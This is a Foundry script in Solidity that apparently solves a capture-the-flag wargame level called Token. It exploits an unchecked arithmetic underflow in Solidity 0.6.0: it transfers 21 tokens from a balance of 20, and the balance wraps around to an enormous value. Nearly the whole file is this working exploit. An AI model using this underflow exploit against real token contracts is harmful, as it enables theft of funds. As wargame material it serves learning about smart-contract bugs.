//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

//Goal:
//Gain more than 20 tokens
//Solution:Version 0.6.0 is vulnerable to arithmetic overflows and underflows so we manipulate that to get 21 tokens.

import {Token} from "../src/Token.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";

contract TokenSolution is Script {
    Token public tokenInstance =
        Token(0xd5610649aa6052d914840C7CAe0Af7c3A4aD24a0);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenInstance.transfer(address(0), 21);
        console.log(
            "My balance: ",
            tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS"))
        );
        vm.stopBroadcast();
    }
}
